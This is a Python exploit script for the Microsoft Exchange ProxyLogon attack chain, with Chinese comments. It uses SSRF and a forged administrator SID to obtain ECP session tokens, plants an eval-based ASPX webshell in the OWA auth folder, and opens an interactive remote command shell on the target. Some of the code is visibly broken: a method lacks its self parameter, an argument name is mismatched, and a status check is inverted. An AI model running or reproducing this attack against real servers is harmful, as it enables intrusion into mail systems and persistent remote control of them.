import argparse
import random
import string
from glob import escape
import requests
import urllib3


def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class ProxyLogon(object):
    def __init__(self, target, mail, proxy):
        self.target = target
        self.mail = mail
        self.proxy = proxy

        self.FQDN = ""
        self.legacyDn = ""
        self.sid = ""
        self.SessionId = ""
        self.msExchEcpCanary = ""
        self.RawIdentity = ""

        self.session = requests.Session()
        # 基础的header头
        self.session.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"}

    def http_get(self, header):
        response = self.session.get(self.target, headers=header, verify=False, proxies=self.proxy,
                                    allow_redirects=False)
        return response

    def http_post(self, header, values):
        response = self.session.post(self.target, data=values, headers=header, verify=False, proxies=self.proxy)
        return response

    def http_post_json(self, header, values):
        response = self.session.post(self.target, data=values, headers=header, verify=False, proxies=self.proxy)
        return response

    # 验证是否存在ssrf漏洞
    def ssrf(self):
        header = {
            'Cookie': 'X-BEResource=localhost~1942062522'
        }
        resp = self.http_get(header)
        if resp is not None:
            if "X-CalculatedBETarget" in resp.headers and "X-FEServer" in resp.headers:
                self.FQDN = resp.headers["X-FEServer"]
                print("[+] 目标Exchange服务器存在SSRF漏洞")
                print("[+] 目标Exchange服务器FQDN名称为%s" % self.FQDN)
            else:
                print("[-] 目标Exchange服务器可能不存在SSRF漏洞，请手工测试")
                exit(0)
        else:
            print("[-] 无法发送请求或服务器无响应")

    # 获取LegacyDN
    def get_LegacyDn(self):
        request_body = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
        <Request>
          <EMailAddress>%s</EMailAddress> 
          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
        </Request>
    </Autodiscover>
    """ % args.email
        header = {
            'Cookie': '%s/autodiscover/autodiscover.xml?a=~1942062969;' % self.FQDN,
            'Content-Type': 'text/xml'
        }
        resp = self.http_post(header, request_body)
        if resp.status_code != 200 or "<LegacyDN>" not in str(resp.content):
            print("[-] 获取LegacyDN失败")
            exit(0)
        else:
            self.legacyDn = str(resp.content).split("<LegacyDN>")[1].split(r"</LegacyDN>")[0]
            print("[+] legacyDN为%s" % self.legacyDn)

    # 获取sid
    def get_sid(self):
        request_body = self.legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
        header = {
            "Cookie": "X-BEResource=Adminstrator@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.labs&a=~1942062522;" % self.FQDN,
            "Content-Type": "application/mapi-http",
            "X-RequestId": "{E2EA6C1C-E61B-49E9-38184F907552}:123456",
            "X-Clientinfo": "{2F94A2BF-A2E6-4CCC-BF98-B5F22C542226}",
            "X-ClientApplication": "Outlook/15.00.0000.0000",
            "x-requesttype": "connect"
        }
        resp = self.http_post(header, request_body)
        if resp.status_code != 200 or "act as owner of a UserMailbox" not in str(resp.content):
            print("[-] 获取SID失败")
            exit(0)
        else:
            self.sid = str(resp.content).split("with SID ")[1].split(" and MasterAccountSid")[0]
            print("[+] SID为 %s" % self.sid)

    # 获取ASP.NET_SessionId 和msExchEcpCanary
    def get_SessionId_msExchEcpCanary(self):
        sid = self.sid.replace(self.sid.split("-")[-1], "500")
        request_body =  """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>""" % sid
        header = {
            "Cookie": "X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % self.FQDN,
            "Content-Type": "text/xml",
            "msExchLogonMailbox": "S-1-5-10"
        }
        resp = self.http_post(header,request_body)
        if resp.status_code != 241 or "Set-Cookie" in resp.headers:
            print("[-] 获取 ASP.NET_SessionId 和msExchEcpCanary失败")
        else:
            self.SessionId = resp.headers['Set-Cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]
            self.msExchEcpCanary = resp.headers['Set-Cookie'].split("msExchEcpCanary=")[1].split(";")[0]
            print("[+] ASP.NET_SessionId: %s" % self.SessionId)
            print("[+] msExchEcpCanary: %s" % self.msExchEcpCanary)

    # 获取OAB接口的RawIdentity
    def get_RawIdentity(self):
        header = {
            'Cookie': 'X-BEResource=administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s' % (self.FQDN,self.SessionId,self.msExchEcpCanary),
            'Content-Type': 'application/json',
            'msExchLogonMailbox': 'S-1-5-20'
        }
        request_body = """{"filter": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel"}}, "sort": {}}"""
        resp = self.http_post(header,request_body)
        if resp.status_code != 200:
            print("[-] 获取OAB接口的RawIdentity失败")
        else:
            self.RawIdentity = str(resp.content).split('"RawIdentity=":"')[1].split('"')[0]
            print("[+] RawIdentity 为： %s" % self.RawIdentity)

    #上传webshell，并且设置保存路径
    def upload_webshell(self, webshell, shell_path):
        webshell_name = id_generator(6) + ".aspx"
        request_body = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": self.RawIdentity},
                "properties": {
                    "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                   "ExternalUrl": "%s" % webshell}}}
        header = {
            'Content-Type': 'application/json; charset=UTF-8',
            'msExchLogonMailbox': 'S-1-5-20',
            'Cookie': "X-BEResource=administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (self.FQDN,self.msExchEcpCanary,self.SessionId,self.msExchEcpCanary)
        }
        resp = self.http_post_json(header, request_body)
        if resp.status_code != 200:
            print("[-] 上传webshell 失败！")
            exit(0)

        #将webshell保存到指定位置
        path = shell_path + webshell_name
        shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % path
        request_body = {
        "identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": self.RawIdentity},
        "properties": {
            "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                           "FilePathName": shell_absolute_path}}}
        header['Cookie'] = "X-BEResource=administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (self.FQDN , self.msExchEcpCanary , self.SessionId , self.msExchEcpCanary)
        resp = self.http_post_json(header,request_body)
        if resp.status_code != 200:
            print("[-] 保存webshell失败")
            exit(0)
        else:
            webshell = "http://"+args.target+"/owa/auth/"+webshell_name
            print("[+] webshell保存成功，webshell路径为： %s" % webshell)
            return  webshell

    #执行命令
    def exec_cmd(webshell_url, code):
        while True:
            cmd = input("<cmd> ")
            if cmd.lower() == "exit" or cmd.lower() == "quit":
                exit(0)
            body = '%s=Response.Write(new ActiveXObject("WScript.Shell").exec("%s").stdout.readall());' % (code, escape(cmd))
            header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            resp = requests.post(webshell_url,headers=header,verify=False,time=20,proxies=args.proxy)
            if resp.status_code == 200:
                print("[+] >>> %s" % resp.text.split('Name')[0])
            elif resp.status_code == 500:
                print("[-] <<< 命令有误" )
            else:
                print("[-] webshell 访问失败")

if __name__ == '__main__':

    banner = '''
__________                                 .____                                      
\______   \_______   ____  ___  ___ ___.__.|    |      ____     ____    ____    ____  
 |     ___/\_  __ \ /  _ \ \  \/  /<   |  ||    |     /  _ \   / ___\  /  _ \  /    \ 
 |    |     |  | \/(  <_> ) >    <  \___  ||    |___ (  <_> ) / /_/  >(  <_> )|   |  \
 |____|     |__|    \____/ /__/\_ \ / ____||_______ \ \____/  \___  /  \____/ |___|  /
                                 \/ \/             \/        /_____/               \/ 
                                                                                                                                                            
                                                                                      
                                                                                @auther:T3y
    '''
    print(banner)
    # 关闭SSL警告
    urllib3.disable_warnings()

    # 接收命令行参数
    parser = argparse.ArgumentParser(description="Exchange ProxyLogon攻击链利用脚本！")
    parser.add_argument("-t", "--target", help="Exchange服务器", type=str, required=True)
    parser.add_argument("-u", "--mail", help="有效的邮箱", type=str, required=True)
    parser.add_argument("--proxy", help="是否开启代理，默认不开启", metavar="")
    args = parser.parse_args()
    if args.proxy:
        args.proxy = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }

    # 生成target
    random_name = id_generator(4) + ".js"
    target = "https://%s/ecp/%s" % (args.target, random_name)

    webshell_content = """http://ffff/#<script language="JScript" runat="server"> function Page_Load(){/ **/eval(Request["code"],"unsafe");}</script>"""

    shellpath = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\"

    proxylogon = ProxyLogon(target, args.mail, args.proxy)

    proxylogon.ssrf()
    proxylogon.get_LegacyDn()
    proxylogon.get_sid()
    proxylogon.get_SessionId_msExchEcpCanary()
    webshell_url =  proxylogon.upload_webshell(webshell_content, shellpath)
    proxylogon.exec_cmd(webshell_url)